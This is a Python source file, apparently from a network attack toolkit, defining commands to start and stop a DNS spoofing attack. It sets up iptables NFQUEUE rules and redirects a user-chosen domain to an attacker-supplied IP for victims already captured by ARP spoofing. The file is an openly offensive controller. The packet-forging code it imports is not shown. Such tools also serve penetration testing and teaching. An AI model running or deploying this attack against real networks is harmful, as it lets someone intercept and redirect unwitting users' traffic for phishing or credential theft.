from command.command import Command
from dns_spoof.dns_spoofer import DnsSpoofer
from iptables_manager.iptables_controller import IptablesController
from utils.utils import press_enter_and_clear_screen
from configuration.configuration import Configuration
import os
import time

# Global instance to persist state across command calls
_dns_spoofer = DnsSpoofer()

class DnsSpoofStart(Command):
    """
    Starts a DNS Spoofing attack.
    Automatically handles Iptables NFQUEUE setup.
    """
    def execute(self):
        config = Configuration()
        mim_targets: set = config.get_configuration(key='mim_targets')
        
        if not mim_targets or len(mim_targets) == 0:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n--- DNS Spoofing: Start Attack ---")
            print("[-] No active MIM targets. Please start an ARP Spoofing attack first.")
            time.sleep(1.5)
            return

        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n--- DNS Spoofing: Start Attack ---")
        print("\nActive MIM Targets:")
        sorted_targets = sorted(list(mim_targets))
        for idx, target in enumerate(sorted_targets, 1):
            print(f"{idx}. {target}")
            
        print(f"\nTargeting all mapped traffic for these victims.")
        
        target_domain = input("\nEnter domain to spoof (ex: www.bing.com): ")
        if not target_domain:
            print("[-] Domain cannot be empty.")
            time.sleep(1.5)
            return

        # Default to local IP if possible
        redirect_ip = input("Enter redirection IP (usually your Kali IP): ")
        if not redirect_ip:
            print("[-] Redirect IP cannot be empty.")
            time.sleep(1.5)
            return

        # 1. Enable IPTABLES Rules
        success = IptablesController.set_dns_spoof_rules(enable=True)
        if not success:
            print("[-] FAILED to setup iptables rules. Check sudo.")
            time.sleep(2)
            return

        # 2. Start Spoofer
        try:
            _dns_spoofer.start(target_domain, redirect_ip)
            print(f"\n[+] DNS Spoofing ACTIVE for {target_domain} -> {redirect_ip}")
            print("[*] Traffic is being intercepted via NFQUEUE 0.")
        except Exception as e:
            print(f"[-] Error starting spoofer: {e}")
            IptablesController.set_dns_spoof_rules(enable=False)
        
        press_enter_and_clear_screen()

    def set_configuration(self, value):
        pass

class DnsSpoofStop(Command):
    """
    Stops the DNS Spoofing attack and cleans up iptables.
    """
    def execute(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n--- DNS Spoofing: Stop Attack ---")
        
        _dns_spoofer.stop()
        IptablesController.set_dns_spoof_rules(enable=False)
        
        print("\n[+] DNS Spoofing deactivated and rules cleaned.")
        press_enter_and_clear_screen()

    def set_configuration(self, value):
        pass
